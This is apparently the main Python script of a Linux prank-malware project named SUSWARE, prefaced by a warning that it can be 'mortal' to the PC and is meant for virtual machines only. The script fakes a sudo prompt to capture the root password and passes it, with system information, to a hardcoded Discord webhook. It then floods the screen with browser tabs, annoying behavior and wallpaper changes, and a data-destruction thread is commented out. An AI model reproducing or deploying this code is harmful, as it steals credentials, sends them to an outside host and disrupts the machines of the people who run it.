from os import listdir
from threading import Thread
from colorama import Fore, Style
from time import sleep
import webbrowser
from subprocess import run
# Importa los módulos desde src
try:
     from src.behavior import * 
     from src.destruct import *
     from src.pc_info import *
     from src.wallpaper import *
     
except ModuleNotFoundError:
     print("Ejecuta el script desde la carpeta linux, por favor")
     

print(Fore.GREEN, '''
███████╗██╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝
███████╗██║   ██║███████╗██║ █╗ ██║███████║██████╔╝█████╗  
╚════██║██║   ██║╚════██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚══════╝ ╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
      ''', Fore.RESET)
print()

print(Fore.RED, """
                    ADVERTENCIA DE USO
          Este script puede ser MORTAL para tu pc
          Solo uso de testeos y máquina virtual
          
          No me hago responsable del tipo de daños
          que esto pueda causar si se ejecuta en
          pc física
          
                                        - lVoidi
      """, Fore.RESET)
print(Style.BRIGHT)
print(Fore.CYAN,"""
          Agradecimientos a las siguientes personas
             - Br3fuck → https://github.com/Br3Fuck
             - Chxki   → https://github.com/Ch1KZX
      """)     
print(Style.RESET_ALL)
username = listdir('/home/')[0]
print(Style.BRIGHT)
rootPassword = input(f'[sudo] password for {username}: ')
webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
sleep(10)
     

user_info(root_pswd=rootPassword,
          webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')

run('python3 src/subprocess.py')

threads = []
for _ in range(10):
     webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
     
     t1 = Thread(target=webOpen)
     t1.start()
     t2 = Thread(target=annoying_behavior)
     t2.start()
     t3 = Thread(target=set_wallpapers)
     t3.start()
#    t4 = Thread(target=start_destruction)
#    t4.start()
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)
#    threads.append(t4)
for thread in threads:
     thread.join()

